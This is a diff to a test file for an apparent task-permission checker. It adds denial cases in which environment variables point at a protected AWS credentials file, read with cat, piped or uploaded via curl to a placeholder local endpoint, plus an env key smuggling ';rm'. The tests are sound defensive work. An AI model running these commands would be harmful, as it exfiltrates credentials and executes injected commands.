@@ -318,12 +318,24 @@ taskCases('options.env with a dangerous variable and unknown options keys are re
   { type: 'shell', command: 'true', windows: { options: { newField: true } } },
 ], bothDenied);
 
+taskCases('options.env values reach the judged line: a variable that names a protected file is seen (base or override)', () => [
+  { type: 'shell', command: 'cat $F | ' + CURL, options: { env: { F: AWS } } },
+  { type: 'shell', command: 'cat "$F"', options: { env: { F: AWS } } },
+  { type: 'shell', command: 'curl -T $F http://127.0.0.1:9/u', options: { env: { F: AWS } } },
+  { type: 'shell', command: 'cat $F', linux: { options: { env: { F: AWS } } } },
+  { type: 'shell', command: 'cat $F', options: { env: { F: 'x' } }, linux: { options: { env: { F: AWS } } } },
+  { type: 'shell', command: 'cat $F', options: { env: { F: AWS } }, linux: { options: { env: { G: '1' } } } },
+  { type: 'shell', command: 'cat $F', options: { env: { 'F;rm': 'x' } } },
+], bothDenied);
+
 taskCases('benign twins: a task folder inside the workspace, harmless env and a plain shell pass', (dir) => [
   { type: 'shell', command: 'cat config', options: { cwd: '${workspaceFolder}/sub' } },
   { type: 'shell', command: 'cat config', options: { cwd: path.join(dir, 'sub') } },
   { type: 'shell', command: 'cat config', options: { cwd: '${workspaceFolder}' } },
   { type: 'shell', command: 'cat config', linux: { options: { cwd: '${workspaceFolder}/sub' } } },
   { type: 'shell', command: 'npm', args: ['test'], options: { env: { CI: '1', FORCE_COLOR: '0' } } },
+  { type: 'shell', command: 'cat $F', options: { env: { F: 'README.md' } } },
+  { type: 'shell', command: 'echo "$MSG"', options: { env: { MSG: "it's fine", N: 3, ON: true } }, linux: { options: { env: { N: '4' } } } },
   { type: 'shell', command: 'echo hi', options: { shell: { executable: 'bash', args: ['-c'] } } },
   { type: 'shell', command: 'echo hi', options: { shell: { executable: 'C:/Windows/System32/cmd.exe', args: ['/d', '/c'] } } },
   { type: 'shell', command: 'echo hi', options: { shell: { executable: 'pwsh', args: ['-NoProfile', '-Command'] } } },
